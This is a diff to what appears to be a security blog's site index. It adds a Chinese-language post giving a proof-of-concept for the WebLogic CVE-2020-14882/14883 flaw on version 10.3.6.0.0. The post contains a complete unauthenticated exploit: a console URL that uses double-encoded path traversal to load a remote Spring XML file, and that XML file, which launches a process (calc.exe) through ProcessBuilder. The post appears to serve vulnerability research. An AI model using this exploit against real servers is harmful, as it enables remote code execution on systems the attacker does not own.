@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2020-14882/14883 适用于Weblogic 10.3.6.0.0版本的poc</title>
+      <link href="/CVE-2020-14882/"/>
+      <url>/CVE-2020-14882/</url>
+      
+        <content type="html"><![CDATA[<p>目前网上给出的poc，适用于12版本Weblogic，但并不适用于10.3.6.0.0版本，因此这里给出一个适用于Weblogic 10.3.6.0.0版本的测试 poc</p><p>无需登录Weblogic，访问如下链接：</p><p><a href="http://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1/poc_xml.xml&quot;)">http://localhost:7001/console/css/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1/poc_xml.xml&quot;)</a></p><p>poc_xml.xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web漏洞分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</title>
       <link href="/weblogic-CVE-2015-4852-CVE-2016-0638-CVE-2016-3510/"/>
       <url>/weblogic-CVE-2015-4852-CVE-2016-0638-CVE-2016-3510/</url>
